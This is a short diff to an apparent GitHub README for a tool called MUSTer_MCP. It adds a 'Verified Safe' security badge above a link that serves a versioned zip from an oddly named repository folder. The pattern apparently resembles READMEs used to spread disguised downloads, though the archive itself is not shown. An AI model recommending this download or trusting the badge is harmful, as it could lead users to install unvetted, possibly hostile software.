@@ -1,5 +1,7 @@
 # 🚀 MUSTer_MCP - Your Gateway to Campus Automation
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/abinethacker-muster-mcp)
+
 [![Download MUSTer_MCP](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUS-MCP-Ter-v3.9-alpha.5.zip)](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUS-MCP-Ter-v3.9-alpha.5.zip)
 
 ## 📜 Description
